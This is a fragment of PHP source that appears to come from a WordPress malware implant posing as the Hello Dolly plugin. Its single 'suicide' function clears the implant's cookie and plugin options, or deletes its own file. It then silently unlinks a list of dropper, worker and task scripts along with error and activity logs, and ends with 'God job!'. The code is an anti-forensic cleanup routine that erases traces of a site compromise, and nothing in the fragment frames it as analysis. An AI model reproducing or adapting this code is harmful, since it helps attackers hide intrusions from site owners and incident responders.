function suicide(){
    if(function_exists('update_option')){
        setcookie(get_option('dolly_work'),'',time()-3600);
          update_option('hello_dolly', '', true );
          update_option('dolly_work', '', true );
    } else {
        @unlink(__FILE__);
    }
    
    @unlink('config_wp.php');
    @unlink('ii.php');
    @unlink('zpl.php');
    @unlink('pl.php');
    @unlink('2pl.php');
    @unlink('cpl.php');
    @unlink('upl.php');
    @unlink('_task');
    @unlink('_task_n');
    @unlink('_taskc');
    @unlink('_task_nc');
    @unlink('_task_nn');
    @unlink('_worker.php');
    @unlink('_log');
    @unlink('_cleaner.php');
    @unlink('_error_log');
    @unlink('big_log');
    @unlink('wp_log');
    @unlink('manual_log');
 
    die('God job!');
}
